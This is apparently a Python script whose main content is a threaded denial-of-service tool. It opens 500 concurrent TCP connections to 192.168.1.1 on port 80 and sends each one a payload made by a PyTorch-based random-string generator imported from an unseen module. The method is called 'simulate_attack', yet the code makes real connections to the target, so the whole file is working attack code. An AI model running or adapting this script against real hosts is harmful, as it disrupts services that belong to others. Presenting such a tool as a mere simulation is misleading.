import torch
import torch.nn as nn
import socket
import threading
from .random_string_generator import RandomStringGenerator


class DoSAttack:
    def __init__(self, target_ip, target_port, num_connections):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_connections = num_connections
        self.threads = []
        self.model = RandomStringGenerator(100)

    def simulate_attack(self):
        for _ in range(self.num_connections):
            thread = threading.Thread(target=self.create_connection)
            self.threads.append(thread)
            thread.start()

    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            payload = self.model(torch.tensor([])).encode()  # Generate payload
            sock.send(payload)
            print("Payload: ", payload)
            sock.send(b"QUIT")
            sock.close()
        except Exception as e:
            print(f"Exception occurred while creating a connection: {e}")

    def wait_for_threads(self):
        for thread in self.threads:
            thread.join()


if __name__ == "__main__":
    dos = DoSAttack(
        "192.168.1.1", 80, 500
    )  # target IP, target port, number of connections
    dos.simulate_attack()
    dos.wait_for_threads()
